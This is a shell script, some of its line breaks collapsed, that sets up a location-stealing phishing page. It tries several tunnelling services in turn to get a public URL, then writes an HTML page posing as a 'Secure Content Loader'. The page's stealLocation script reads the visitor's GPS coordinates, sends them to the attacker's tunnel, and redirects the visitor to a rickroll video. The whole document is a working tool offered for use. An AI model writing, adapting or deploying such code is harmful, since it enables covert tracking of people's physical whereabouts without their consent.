#!/bin/sh

clear echo "Starting tunnel... (trying Serveo, then cloudflared, then ngrok, then npx localtunnel)" echo "-------------------------------------------"

Global var to store public URL

varurl=""

start_serveo() { ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -R 80:localhost:8080 serveo.net 2>&1 | tee ~/gps.log & SSH_PID=$! sleep 8 # Extract Serveo URL: look for "https://*.serveo.net" varurl=$(grep -oE "https://[^"]+.serveo.net" ~/gps.log | head -n1) if [ -z "$varurl" ]; then kill $SSH_PID 2>/dev/null return 1 fi return 0 }

start_cloudflared() { if command -v cloudflared >/dev/null 2>&1; then cloudflared tunnel --url http://localhost:8080 --logfile ~/gps.log > /dev/null 2>&1 & CLOUDFLARE_PID=$! sleep 8 # Extract Cloudflare URL: look for "https://*.trycloudflare.com" or other domains varurl=$(grep -oE "https://[a-z0-9.-]+.trycloudflare.com" ~/gps.log | head -n1) if [ -z "$varurl" ]; then kill $CLOUDFLARE_PID 2>/dev/null return 1 fi return 0 fi return 1 }

start_ngrok() { if command -v ngrok >/dev/null 2>&1; then ngrok http 8080 --log=stdout > ~/gps.log 2>&1 & NGROK_PID=$! sleep 10 # Extract Ngrok URL: look for "https://*.ngrok.io" varurl=$(grep -oE "https://[a-z0-9]+.ngrok.io" ~/gps.log | head -n1) if [ -z "$varurl" ]; then kill $NGROK_PID 2>/dev/null return 1 fi return 0 fi return 1 }

start_npx() { if command -v npx >/dev/null 2>&1; then npx localtunnel --port 8080 --print-requests > ~/gps.log 2>&1 & NPX_PID=$! sleep 8 # Extract Localtunnel URL: look for "your url is: https://..." varurl=$(grep -oE "https://[a-z0-9.-]+.loca.lt" ~/gps.log | head -n1) if [ -z "$varurl" ]; then kill $NPX_PID 2>/dev/null return 1 fi return 0 fi return 1 }

Attempt each tunnel method until varurl is set

if start_serveo; then echo "[✓] Serveo tunnel started: $varurl" TUNNEL_TYPE="Serveo" TUNNEL_PID=$SSH_PID elif start_cloudflared; then echo "[✓] Cloudflared tunnel started: $varurl" TUNNEL_TYPE="Cloudflared" TUNNEL_PID=$CLOUDFLARE_PID elif start_ngrok; then echo "[✓] Ngrok tunnel started: $varurl" TUNNEL_TYPE="Ngrok" TUNNEL_PID=$NGROK_PID elif start_npx; then echo "[✓] NPX Localtunnel started: $varurl" TUNNEL_TYPE="Localtunnel (npx)" TUNNEL_PID=$NPX_PID else echo "[✗] All tunnel services failed to start. Please install Serveo, cloudflared, ngrok, or npx localtunnel." exit 1 fi

clear echo "Tunnel active via $TUNNEL_TYPE: $varurl" echo "Check ~/gps.log for details." echo "-------------------------------------------" echo "Press Ctrl+C to terminate." echo

Generate phishing page using varurl

mkdir -p ~/webpage cat <<EOF > ~/webpage/index.html

<!DOCTYPE html><html>
<head>
    <title>Secure Content Loader</title>
    <style>
        body {
            background-image: url("https://user-images.githubusercontent.com/3501170/55271108-d11b3180-52fb-11e9-97e2-c930be295147.png");
            background-size: cover;
            background-repeat: no-repeat;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            text-shadow: 1px 1px 2px black;
            flex-direction: column;
        }
        .loading {
            font-size: 1.5em;
            animation: blink 1s infinite;
        }
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="loading">Loading secure content...</div><script>
    function httpGet(theUrl) {
        fetch(theUrl, { mode: 'no-cors' }).catch(err => console.log("Error sending location:", err));
    }

    function stealLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    const coords = position.coords.latitude + ',' + position.coords.longitude;
                    const url = "${varurl}/logme/" + coords;
                    httpGet(url);

                    setTimeout(() => {
                        window.location.href = "https://shattereddisk.github.io/rickroll/rickroll.mp4";
                    }, 3000);
                },
                function(err) {
                    console.log("Geolocation error:", err);
                }
            );
        }
    }

    setTimeout(stealLocation, 1500);
</script>

</body>
</html>
EOFStart local HTTP server

cd ~/webpage || exit 1 if command -v python3 >/dev/null 2>&1; then python3 -m http.server 8080 >/dev/null 2>&1 & SERVER_PID=$! echo "[✓] Server started using Python at http://localhost:8080" elif command -v busybox >/dev/null 2>&1; then busybox httpd -f -p 8080 & SERVER_PID=$! echo "[✓] Server started using BusyBox at http://localhost:8080" else echo "[✗] No supported web server found (python3 or busybox required)." kill $TUNNEL_PID 2>/dev/null exit 1 fi

trap 'echo "\n[+] Cleaning up..."; kill $TUNNEL_PID $SERVER_PID 2>/dev/null' EXIT

wait

